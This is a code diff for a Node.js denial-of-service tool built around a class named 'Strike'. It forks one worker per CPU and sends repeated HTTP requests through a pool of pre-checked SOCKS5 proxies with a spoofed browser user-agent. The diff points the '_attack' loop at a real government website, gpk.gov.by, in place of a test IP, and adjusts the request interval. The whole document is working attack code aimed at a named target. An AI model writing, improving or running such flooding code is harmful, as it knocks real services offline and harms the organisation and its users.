@@ -8,6 +8,7 @@ const http = require("http");
 const { Agent } = require("socks5-http-client");
 const { socks5 } = require("./proxy.socks5");
 const EventEmitter = require("events");
+const ProxyChecker = require("./proxyChecker");
 
 const numCPUs = os.cpus().length <= 2 ? 2 : os.cpus().length - 1;
 
@@ -15,6 +16,7 @@ class Strike {
   constructor() {
     this.counter = 0;
     this.eventEmitter = new EventEmitter();
+    this.proxyChecker = new ProxyChecker();
   }
 
   async init() {
@@ -23,8 +25,7 @@ class Strike {
         this._fork();
       }
 
-      this._axiosResolveInterceptor();
-      const avaliableProxies = await this._checkProxyConnection();
+      const avaliableProxies = await this.proxyChecker.getProxies();
       this._axiosRejectInterceptor();
 
       if(!avaliableProxies.length) {
@@ -47,47 +48,9 @@ class Strike {
     }
   }
 
-  _axiosResolveInterceptor() {
-    axios.interceptors.response
-      .use((response) => response, (error) => Promise.resolve(error));
-  }
-
   _axiosRejectInterceptor() {
     axios.interceptors.response
       .use((response) => response, (error) => Promise.reject(error));
-  }
-
-  async _checkProxyConnection() {
-    const link = "https://google.com";
-    
-    const requests = socks5.map((endpoint) => {
-      return axios({
-        url: link,
-        method: "GET",
-        httpsAgent: new SocksProxyAgent(endpoint),
-        timeout: 5000,
-        clarifyTimeoutError: false,
-      });
-    });
-
-    console.info("[Info]:", "Proxy check started");
-    const responses = await Promise.all(requests).then(data => data).catch(() => Promise.resolve());
-    console.info("[Info]:", "Proxy check ended")
-
-    return responses.reduce((available, response) => {
-      const { status } = response;
-
-      if(response && status && status === 200) {
-        const { host, port, type } = response.config.httpsAgent.proxy;
-        console.info("[Info]:", "Server:", `${host}:${port}`, "Status:", response.status);
-        available.push(`socks${type}://${host}:${port}`);
-      } else {
-        const { host, port } = response.config.httpsAgent.proxy;
-        console.error("[Error]:", "Server:", `${host}:${port}`, "Message:", response.message);
-      }
-
-      return available;
-    }, []);
   }
 
   async _attack(avaliableProxies) {
@@ -95,15 +58,16 @@ class Strike {
       setInterval(async () => {
         try {
           const agent = new SocksProxyAgent(server);
-          const link = "http://185.233.36.205:3001/api-doc/#/";
-          const response = await axios(link, {
+          const link = "https://gpk.gov.by";
+          const response = await axios({
+            url: link,
             httpsAgent: agent,
             headers: {
               'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
             },
           });
   
-          setTimeout(() => { console.log(`Response status code: ${response.status}, Link: ${link}, Requests: ${this.counter}`); }, 5000);
+          console.log(`Response status code: ${response.status || response.code}, Link: ${link}, Requests: ${this.counter}`);
           this.counter++;
         } catch (err) {
           if(err.isAxiosError) {
@@ -113,7 +77,7 @@ class Strike {
             console.error("[Error]:", "Message:", err.message);
           }
         }
-      }, 100);
+      }, 500);
     }
   }
 
